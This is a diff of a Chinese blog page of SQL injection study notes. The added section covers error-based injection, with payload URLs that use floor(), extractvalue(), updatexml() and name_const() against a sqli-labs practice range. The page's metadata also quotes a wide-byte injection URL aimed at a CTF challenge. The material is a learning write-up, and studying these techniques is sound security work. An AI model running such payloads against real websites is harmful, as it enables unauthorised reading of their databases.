@@ -97,7 +97,7 @@
 <meta property="og:image" content="https://legoc.github.io/2018/09/17/SQL注入学习/3.png">
 <meta property="og:image" content="https://legoc.github.io/2018/09/17/SQL注入学习/10.jpg">
 <meta property="og:image" content="https://legoc.github.io/2018/09/17/SQL注入学习/11.jpg">
-<meta property="og:updated_time" content="2018-09-20T01:20:10.470Z">
+<meta property="og:updated_time" content="2019-01-26T11:50:08.665Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入学习">
 <meta name="twitter:description" content="由题引入南邮CTF sql injection 3 这是一道宽字节注入 分析一下 1234验证字段数http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&amp;apos; order by 1,2 %23  （正常）http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&amp;apos; orde">
@@ -444,6 +444,14 @@
 <p>python中的time模块</p>
 <p>函数 time()   获取当前时间戳，即计算机内部时间值，浮点数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; time.time();</span><br><span class="line">1537405183.661</span><br></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>最近发现了有在线的sqli-labs靶场 来自 <a href="https://bbs.pediy.com/thread-218653.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218653.htm</a></p>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1&apos; and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)b)--+</span><br></pre></td></tr></table></figure>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>extractvalue()接受两个字符串参数，一个xml标记xml_frag的片段和一个xpath表达式xpath_expr(也称为定位符)。这个函数返回第一个文本节点的文本。我们可以在xpath中填写获得我们想要的信息的语句。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1&apos; and 1=extractvalue(1,concat(0x7c,(select database()))) --+</span><br></pre></td></tr></table></figure>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>updatexml(xml_target,xpath_expr,new_xml)<br>此函数用新的xml片段new_xml替换xml标记xml_target的给定片段的单个部分，然后返回更改的xml。被替换的xml_target的部分与用户提供的xpath表达式xpath_expr匹配。在 mysql 5.6.6及更早版本中，xpath表达式最多可以包含127个字符。这个限制在mysql 5.6.7中解除。如果没有找到匹配xpath_expr的表达式，或者找到多个匹配项，函数将返回原始的xml_target片段。 所有三个参数应该是字符串。我们可以在xpath中填写获得我们想要的信息的语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1&apos; and 1=updatexml(1,concat(0x7c,(select database())),3)--+</span><br></pre></td></tr></table></figure>
+<h4 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h4><p>name_const(name,value)<br>用于生成结果时，name_const()会使列具有给定的名称。参数应该是常量。它和select value as name是等价的。我们可以构造两个列使得它们名字一样并在列名中填写获得我们想要的信息的语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1&apos; and 1=(select * from(select name_const(version(),1),name_const(version(),1))b) --+</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -588,7 +596,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -610,7 +618,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-count">50</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -643,7 +651,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#由题引入"><span class="nav-number">1.</span> <span class="nav-text">由题引入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#表结构"><span class="nav-number">2.1.</span> <span class="nav-text">表结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#函数"><span class="nav-number">2.2.</span> <span class="nav-text">函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-number">3.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于bool型的盲注"><span class="nav-number">3.1.</span> <span class="nav-text">基于bool型的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些知识点"><span class="nav-number">3.2.</span> <span class="nav-text">一些知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于时间型盲注"><span class="nav-number">3.3.</span> <span class="nav-text">基于时间型盲注</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#由题引入"><span class="nav-number">1.</span> <span class="nav-text">由题引入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#表结构"><span class="nav-number">2.1.</span> <span class="nav-text">表结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#函数"><span class="nav-number">2.2.</span> <span class="nav-text">函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-number">3.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于bool型的盲注"><span class="nav-number">3.1.</span> <span class="nav-text">基于bool型的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些知识点"><span class="nav-number">3.2.</span> <span class="nav-text">一些知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于时间型盲注"><span class="nav-number">3.3.</span> <span class="nav-text">基于时间型盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#floor"><span class="nav-number">4.1.</span> <span class="nav-text">floor()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue"><span class="nav-number">4.2.</span> <span class="nav-text">extractvalue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml"><span class="nav-number">4.3.</span> <span class="nav-text">updatexml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#name-const"><span class="nav-number">4.4.</span> <span class="nav-text">name_const</span></a></li></ol></li></ol></div>
             
 
           </div>
